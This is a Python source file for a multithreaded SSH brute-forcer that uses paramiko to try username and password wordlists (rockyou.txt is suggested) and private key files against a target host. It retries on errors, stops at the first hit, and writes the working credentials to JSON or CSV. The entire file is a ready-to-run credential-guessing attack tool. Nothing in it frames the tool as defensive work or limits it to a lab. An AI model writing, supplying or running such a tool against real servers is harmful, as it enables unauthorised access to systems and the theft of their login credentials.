import paramiko
import socket
import time
import argparse
import threading
from tqdm import tqdm
from queue import Queue
import csv
import json
from pathlib import Path

lock = threading.Lock()
found_credentials = []
stop_flag = threading.Event()

# function that uses paramiko library to attempt to connect using a username and a key file
def is_ssh_open_key(hostname, username, key_path, port=22, timeout=3):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        key = paramiko.RSAKey.from_private_key_file(key_path)
        client.connect(
            hostname=hostname,
            username=username,
            pkey=key,
            timeout=timeout,
            port=port,
            banner_timeout=timeout,
            auth_timeout=timeout
        )
        return True
    except (paramiko.AuthenticationException, paramiko.SSHException, socket.timeout):
        return False
    except Exception:
        return False
    finally:
        client.close()

# function that attempts an ssh connection using a username and password
def is_ssh_open_password(hostname, username, password, port=22, timeout=3):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=hostname,
            username=username,
            password=password,
            timeout=timeout,
            port=port,
            banner_timeout=timeout,
            auth_timeout=timeout
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        time.sleep(5)
        return is_ssh_open_password(hostname, username, password, port, timeout)
    except Exception:
        return False
    finally:
        client.close()

# worker function that automates the ssh functions by pulling tuples from a queue
def worker(q, host, port, timeout, delay):
    while not q.empty() and not stop_flag.is_set():
        method, username, secret = q.get()
        success = False

        if method == "password":
            success = is_ssh_open_password(host, username, secret, port, timeout)
        elif method == "key":
            success = is_ssh_open_key(host, username, secret, port, timeout)

        if success:
            with lock:
                print(f"\n|+| SUCCESS: {username}@{host}:{port} - {method}: {secret}")
                found_credentials.append({
                    "host": host,
                    "port": port,
                    "username": username,
                    method: secret
                })
                stop_flag.set()
        time.sleep(delay)
        q.task_done()

# function that loads lines from a wordlist accurately, without error
def load_list(path):
    with open(path, "r", encoding="latin-1", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

# function that loads lines from a wordlist for keys
def load_key_files(directory):
    key_files = []
    for p in Path(directory).rglob("*"):
        if p.is_file():
            key_files.append(str(p))
    return key_files

# functions that saves info into json or csv formats
def save_output(credentials, out_file, fmt):
    out_path = Path(out_file)
    if fmt == "json":
        with open(out_path.with_suffix(".json"), "w") as f:
            json.dump(credentials, f, indent=2)
    elif fmt == "csv":
        with open(out_path.with_suffix(".csv"), "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["host", "port", "username", "password", "key"])
            writer.writeheader()
            for cred in credentials:
                cred.setdefault("password", "")
                cred.setdefault("key", "")
                writer.writerow(cred)

# arg parser for cli customizability
def main():
    parser = argparse.ArgumentParser(description="Multithreaded SSH Brute Forcer with Key Support")
    parser.add_argument("host", help="Target SSH server (IP or hostname)")
    parser.add_argument("-u", "--user", help="Single username")
    parser.add_argument("-U", "--userlist", help="Username list file")
    parser.add_argument("-P", "--passlist", help="Password list (e.g., rockyou.txt)")
    parser.add_argument("-K", "--key", help="Single private key file")
    parser.add_argument("-KL", "--keylist", help="Directory or file containing key paths")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of threads (default: 4)")
    parser.add_argument("--timeout", type=int, default=3, help="Connection timeout (default: 3s)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between attempts (default: 0.1s)")
    parser.add_argument("--output", help="Output file (without extension)")
    parser.add_argument("--format", choices=["json", "csv"], help="Output format")
    args = parser.parse_args()

    if not args.user and not args.userlist:
        print("|x| You must specify a username (-u) or a username list (-U).")
        return
    if not args.passlist and not args.key and not args.keylist:
        print("|x| You must provide a password list, key file, or key directory.")
        return

    host = args.host
    port = args.port
    timeout = args.timeout
    delay = args.delay

    passwords = load_list(args.passlist) if args.passlist else []
    key_files = []
    if args.key:
        key_files.append(args.key)
    if args.keylist:
        if Path(args.keylist).is_file():
            key_files += load_list(args.keylist)
        else:
            key_files += load_key_files(args.keylist)

    usernames = [args.user] if args.user else load_list(args.userlist)

    q = Queue()
    for user in usernames:
        for pw in passwords:
            q.put(("password", user, pw))
        for k in key_files:
            q.put(("key", user, k))

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(q, host, port, timeout, delay))
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    if found_credentials:
        if args.output and args.format:
            save_output(found_credentials, args.output, args.format)
        else:
            print(f"|+| Found credentials: {found_credentials}")
    else:
        print("|-| No valid credentials found.")

if __name__ == "__main__":
    main()
